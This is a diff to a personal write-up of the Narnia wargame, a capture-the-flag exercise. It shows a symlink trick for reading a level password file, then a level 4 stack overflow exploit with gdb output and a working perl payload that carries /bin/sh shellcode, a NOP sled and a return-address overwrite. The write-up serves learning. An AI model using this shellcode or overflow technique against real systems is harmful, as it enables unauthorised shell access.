@@ -168,3 +168,69 @@ ln -s /etc/narnia_pass/narnia4 /tmp/me/test12345678901234567890/tmp/me/ab
 ```
 This linked the /tmp/me/test12345678901234567890/tmp/me/ab file to the narnia password.  I then read the program with "./narnia3 /tmp/me/test12345678901234567890/tmp/me/a"  and was then able to cat the password from /tmp/me/ab.  The reason ofile is /tmp/me/ab is because those are the values in memory immedaitely after the 32 characters of ifile.
 #Level4
+```
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+	int i;
+	char buffer[256];
+
+	for(i = 0; environ[i] != NULL; i++)
+		memset(environ[i], '\0', strlen(environ[i]));
+
+	if(argc>1)
+		strcpy(buffer,argv[1]);
+
+	return 0;
+}
+```
+Level 4 looks to be another buffer overflow, similar to level 2.  I think level 2 I was supposed to place the shellcode in to an environment variable, which level 4 is preventing.  Since I didn't use that method for level 2, this level will mostly be a repeat.
+Examinging the stack again, I see that my string is going to be copied to 0xffffd57c and eip is saved at 0xffffd68c.  0xffffd68c-0xffffd57c=0x110 (272 decimal).  So, I will print out by 28 byte shellcode, 272-28 A's and then what I want EIP to be (0xffffd57c).
+I executed the command ./narnia4 `perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "A"x244 . "\x7c\xd5\xff\xff"'` but was surprised when it didn't work. I opened it up in gdb and checked and now the buffer was at 0xffffd55c instead of 7c.  I believe the offsets were slightly changing, so I decided to put a NOP sled before my code to improve my odds of hitting what I wanted.
+I came up with the following payload:
+```
+/narnia/narnia4 `perl -e 'print "\x90"x244 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "\x5c\xd5\xff\xff"'`
+```
+Unfortunately I was still getting a segmentation fault and couldn't get it to run. 
+I began debugging it further in GDB.  In GDB I saw I got to my NOP sled and to my shellcode, however the disassembly for my shellcode didn't look right:
+```
+ 8048060: 31 c0                 xor    %eax,%eax
+ 8048062: 50                    push   %eax
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+ 804806d: 89 e3                 mov    %esp,%ebx
+ 804806f: 89 c1                 mov    %eax,%ecx
+ 8048071: 89 c2                 mov    %eax,%edx
+ 8048073: b0 0b                 mov    $0xb,%al
+ 8048075: cd 80                 int    $0x80
+ 8048077: 31 c0                 xor    %eax,%eax
+ 8048079: 40                    inc    %eax
+ 804807a: cd 80                 int    $0x80
+
+(gdb) x/10b $pc-1
+0xffffd664:	0x2f	0x62	0x69	0x6e	0x2f	0x2f	0x73	0x68
+0xffffd66c:	0x00	0x00
+(gdb) x/10i $pc-1
+   0xffffd664:	das    
+=> 0xffffd665:	bound  %ebp,0x6e(%ecx)
+   0xffffd668:	das    
+   0xffffd669:	das    
+   0xffffd66a:	jae    0xffffd6d4
+   0xffffd66c:	add    %al,(%eax)
+   0xffffd66e:	add    %al,(%eax)
+   0xffffd670:	add    %al,(%eax)
+   0xffffd672:	add    %al,(%eax)
+   0xffffd674:	add    $0xd7,%al
+``` 
+The memory at 0xffffd66c appears be corrupted.  I'm not sure why this is, but in any case it looks like I don't have as much space as I thought I had for my shellcode, so let's shorten up the NOP's, and then put some garbage after our shellcode.
+After adjustments, my command was: `perl -e 'print "\x90"x144 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x100 . "\x5c\xd5\xff\xff"'`
+I ran that and it worked in GDB!  When I ran it from the prompt it did not, presumably due to the gdb offset, so I modified it to be:
+````perl -e 'print "\x90"x144 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x100 . "\x7c\xd5\xff\xff"'````
+And finally it worked!
+#Level5
+
